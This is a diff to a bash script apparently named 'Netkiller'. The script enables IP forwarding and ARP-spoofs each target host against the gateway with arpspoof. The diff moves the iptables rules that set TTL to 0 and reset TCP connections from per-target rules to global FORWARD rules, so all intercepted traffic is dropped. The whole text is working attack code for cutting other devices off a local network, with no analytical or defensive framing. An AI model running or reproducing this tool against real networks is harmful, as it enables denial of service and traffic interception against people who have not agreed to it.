@@ -24,6 +24,8 @@ fi
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
 iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -t mangle -A FORWARD -j TTL --ttl-set 0
+iptables -A FORWARD -p tcp -j REJECT --reject-with tcp-reset
 echo " "
 
 # Functions for clean up
@@ -228,10 +230,8 @@ echo " "
 # Start ARP spoofing for each target
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
-     iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
-     iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
 done
-
-echo -e "\nTo stop Netkiller, run: netkiller-stop"
-
+echo " "
+echo "To stop Netkiller, run: netkiller-stop"
+echo " "
